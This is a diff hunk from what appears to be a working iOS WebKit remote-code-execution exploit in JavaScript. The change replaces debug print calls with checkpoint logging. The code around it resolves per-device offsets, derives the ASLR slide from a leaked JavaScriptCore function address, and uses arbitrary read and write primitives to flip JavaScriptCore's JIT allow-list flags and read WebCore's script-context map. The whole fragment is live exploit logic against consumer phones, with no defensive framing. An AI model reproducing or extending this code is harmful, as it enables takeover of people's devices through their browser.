@@ -17997,28 +17997,36 @@ const device_chipset = {
           }
           if (!device_model)
               throw new TryAgainError(`missing device model for ios_version=${ios_version} known_linkedits=${Object.keys(linkedit_map).join(",")} auth_stub_candidates=${auth_stub_candidates.map(x => x.hex()).join(",")}`);
-          print(`pthread_create_auth_stubs_offset: ${selected_pthread_create_auth_stubs_offset.hex()}`);
-          print(`pthread_create_offset: ${selected_pthread_create_offset.hex()}`);
-          print(`pthread_create_got: ${pthread_create_got.hex()}`);
-          print(`pthread_create: ${pthread_create.hex()}`);
-          print(`libsystem_pthread_base: ${libsystem_pthread_base.hex()}`);
-          print(`libsystem_pthread_linkedit: ${libsystem_pthread_linkedit.hex()}`);
-          print("device_model: " + device_model);
+          resolverCheckpoint(`pthread_create_auth_stubs_offset: ${selected_pthread_create_auth_stubs_offset.hex()}`);
+          resolverCheckpoint(`pthread_create_offset: ${selected_pthread_create_offset.hex()}`);
+          resolverCheckpoint(`pthread_create_got: ${pthread_create_got.hex()}`);
+          resolverCheckpoint(`pthread_create: ${pthread_create.hex()}`);
+          resolverCheckpoint(`libsystem_pthread_base: ${libsystem_pthread_base.hex()}`);
+          resolverCheckpoint(`libsystem_pthread_linkedit: ${libsystem_pthread_linkedit.hex()}`);
+          resolverCheckpoint("device_model: " + device_model);
           chipset = device_chipset[device_model];
           const device_offsets = rce_offsets[device_model];
           if (!device_offsets)
               throw new TryAgainError(`missing rce offsets for device_model=${device_model}`);
           offsets = { ...device_offsets };
           slide = globalFuncParseFloat - offsets.JavaScriptCore__globalFuncParseFloat;
-          print(`slide: ${slide.hex()}`);
+          resolverCheckpoint(`slide: ${slide.hex()}`);
+          resolverCheckpoint("sliding offsets begin");
           for (const key of Object.keys(offsets)) {
             if (offsets[key] >= 0x100000000n) offsets[key] += slide;
           }
+          resolverCheckpoint(`sliding offsets done jitAllowList_once=${offsets.JavaScriptCore__jitAllowList_once.hex()} jitAllowList=${offsets.JavaScriptCore__jitAllowList.hex()} contexts=${offsets.WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts.hex()}`);
+          resolverCheckpoint("writing jitAllowList_once");
           write64(offsets.JavaScriptCore__jitAllowList_once, 0xffffffffffffffffn);
+          resolverCheckpoint("wrote jitAllowList_once");
+          resolverCheckpoint("writing jitAllowList flag");
           write64(offsets.JavaScriptCore__jitAllowList + 8n, 1n);
+          resolverCheckpoint("wrote jitAllowList flag");
+          resolverCheckpoint("reading allScriptExecutionContextsMap");
           const contexts = read64(offsets.WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts);
+          resolverCheckpoint(`contexts pointer=${contexts.hex()}`);
           const contexts_length = read32(contexts - 4n);
-          print(`contexts_lenght:${contexts_length.hex()}`);
+          resolverCheckpoint(`contexts_lenght:${contexts_length.hex()}`);
           let worker;
 
           for (let i = 0n; i < contexts_length; ++i) {
